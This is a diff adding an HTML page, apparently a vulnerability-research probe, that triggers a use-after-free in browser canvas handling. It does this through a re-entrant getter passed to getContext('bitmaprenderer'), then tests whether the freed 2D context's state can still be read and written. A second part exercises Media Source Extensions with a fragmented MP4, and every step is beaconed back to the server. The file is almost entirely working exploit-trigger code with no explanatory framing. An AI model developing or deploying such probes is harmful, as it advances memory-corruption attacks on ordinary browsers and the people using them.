@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V534</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<video id="vid" width="1" height="1" muted></video>
+<div id="log">V534 — Dual: Canvas liveness + MSE compat fMP4
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V534-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// ========= PART A: Canvas context liveness check =========
+setTimeout(function(){
+  try{
+    B('A-START','canvas UAF liveness probe');
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    var ctx=null;
+    var s={};
+    Object.defineProperty(s,'alpha',{get:function(){ctx=c.getContext('2d');return true}});
+    var outer=c.getContext('bitmaprenderer',s);
+
+    if(!ctx){B('A-NO-CTX','inner ctx null');return}
+    B('A-UAF','triggered inner='+!!ctx+' outer='+!!outer);
+
+    // Test: is 2d context alive?
+    try{
+      var lw=ctx.lineWidth;
+      B('A-LW-READ','lineWidth='+lw+' (default=1 means ALIVE)');
+    }catch(e){B('A-LW-ERR',''+e)}
+
+    try{
+      ctx.lineWidth=1337.42;
+      var lw2=ctx.lineWidth;
+      B('A-LW-WRITE','set 1337.42 read='+lw2+' (1337.42=ALIVE, else=FREED)');
+    }catch(e){B('A-LW-WRITE-ERR',''+e)}
+
+    try{
+      ctx.save();
+      B('A-SAVE','save() ok');
+      ctx.lineWidth=42.5;
+      var lw3=ctx.lineWidth;
+      B('A-SAVE-LW','inner lineWidth after save='+lw3);
+      ctx.restore();
+      var lw4=ctx.lineWidth;
+      B('A-RESTORE-LW','after restore='+lw4+' (expect 1337.42 if alive)');
+    }catch(e){B('A-SR-ERR',''+e)}
+
+    // Test: getTransform (reads 6 doubles from state)
+    try{
+      var t=ctx.getTransform();
+      B('A-XFORM','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+    }catch(e){B('A-XFORM-ERR',''+e)}
+
+    // Test: getLineDash
+    try{
+      ctx.setLineDash([5,3]);
+      var ld=ctx.getLineDash();
+      B('A-DASH','set [5,3] get=['+ld+'] len='+ld.length);
+    }catch(e){B('A-DASH-ERR',''+e)}
+
+    // Test: fillStyle/strokeStyle
+    try{
+      ctx.fillStyle='#ff0000';
+      var fs=ctx.fillStyle;
+      B('A-FILL','set #ff0000 get='+fs);
+    }catch(e){B('A-FILL-ERR',''+e)}
+
+    // Test: globalAlpha
+    try{
+      ctx.globalAlpha=0.5;
+      var ga=ctx.globalAlpha;
+      B('A-ALPHA','set 0.5 get='+ga);
+    }catch(e){B('A-ALPHA-ERR',''+e)}
+
+    // Test: can we re-get 2d context on same canvas?
+    var ctx2=c.getContext('2d');
+    B('A-REGET-2D',ctx2===null?'null':ctx2===ctx?'SAME':'DIFFERENT');
+    var ctx3=c.getContext('bitmaprenderer');
+    B('A-REGET-BMR',ctx3===null?'null':ctx3===outer?'SAME_OUTER':'DIFFERENT');
+
+    B('A-DONE','canvas liveness probe complete');
+  }catch(e){B('A-ERR',''+e)}
+},200);
+
+// ========= PART B: MSE with compat fMP4 =========
+setTimeout(function(){
+  try{
+    B('B-START','MSE compat fMP4 test');
+    fetch('/test-frag-compat.mp4').then(function(r){
+      if(!r.ok) throw new Error('HTTP '+r.status);
+      return r.arrayBuffer();
+    }).then(function(ab){
+      var data=new Uint8Array(ab);
+      B('B-FETCHED','size='+data.length);
+
+      // Find init/media boundary
+      var initEnd=0,mediaEnd=data.length;
+      var off=0;
+      while(off<data.length-8){
+        var sz=(data[off]<<24)|(data[off+1]<<16)|(data[off+2]<<8)|data[off+3];
+        var tp=String.fromCharCode(data[off+4],data[off+5],data[off+6],data[off+7]);
+        if(sz<8)break;
+        if(tp==='moof'&&!initEnd) initEnd=off;
+        if(tp==='mfra') mediaEnd=off;
+        off+=sz;
+      }
+      B('B-PARSED','init=0-'+initEnd+' media='+initEnd+'-'+mediaEnd);
+
+      var ms=new MediaSource();
+      var vid=document.getElementById('vid');
+      vid.src=URL.createObjectURL(ms);
+
+      vid.addEventListener('error',function(){
+        B('B-VID-ERR','code='+(vid.error?vid.error.code:'?'));
+      });
+
+      ms.addEventListener('sourceopen',function(){
+        B('B-OPEN','readyState='+ms.readyState);
+        var sb;
+        try{sb=ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');B('B-SB','ok')}
+        catch(e){B('B-SB-ERR',''+e);return}
+
+        var phase=0;
+        sb.addEventListener('updateend',function(){
+          phase++;
+          if(phase===1){
+            B('B-INIT-DONE','sb.buffered.length='+sb.buffered.length);
+            B('B-MEDIA-APPEND','bytes '+initEnd+'-'+mediaEnd);
+            sb.appendBuffer(data.slice(initEnd,mediaEnd).buffer);
+          }
+          else if(phase===2){
+            B('B-MEDIA-DONE-PRE','BEFORE buffered access');
+            var blen=-1;
+            try{blen=sb.buffered.length}catch(e){B('B-BUFFERED-ERR',''+e)}
+            B('B-MEDIA-DONE','sb.buffered.length='+blen);
+            if(blen>0){
+              B('B-HAS-RANGES','RANGES EXIST');
+              for(var i=0;i<blen;i++){
+                try{B('B-RANGE-'+i,'start='+sb.buffered.start(i)+' end='+sb.buffered.end(i))}
+                catch(e){B('B-RANGE-ERR',''+e)}
+              }
+            }
+            // Check vid.buffered
+            var vb=-1;
+            try{vb=vid.buffered.length}catch(e){B('B-VID-BUF-ERR',''+e)}
+            B('B-VID-BUF','length='+vb);
+            B('B-SURVIVED','buffered access done');
+
+            // Try play
+            vid.play().then(function(){
+              B('B-PLAY-OK','ct='+vid.currentTime+' rs='+vid.readyState);
+              setTimeout(function(){
+                B('B-PLAY-CHECK','ct='+vid.currentTime);
+                vid.pause();
+                try{if(ms.readyState==='open')ms.endOfStream();B('B-EOS','ok')}
+                catch(e){B('B-EOS-ERR',''+e)}
+              },2000);
+            }).catch(function(e){
+              B('B-PLAY-ERR',''+e);
+              try{if(ms.readyState==='open')ms.endOfStream();B('B-EOS','ok')}
+              catch(e2){B('B-EOS-ERR',''+e2)}
+            });
+          }
+        });
+
+        sb.addEventListener('error',function(){B('B-SB-ERROR','error event')});
+        B('B-INIT-APPEND','bytes 0-'+initEnd);
+        sb.appendBuffer(data.slice(0,initEnd).buffer);
+      });
+      ms.addEventListener('sourceclose',function(){B('B-CLOSE','closed')});
+    }).catch(function(e){B('B-FETCH-ERR',''+e)});
+  }catch(e){B('B-ERR',''+e)}
+},3000);
+
+setTimeout(function(){B('COMPLETE','all done')},20000);
+</script></body></html>
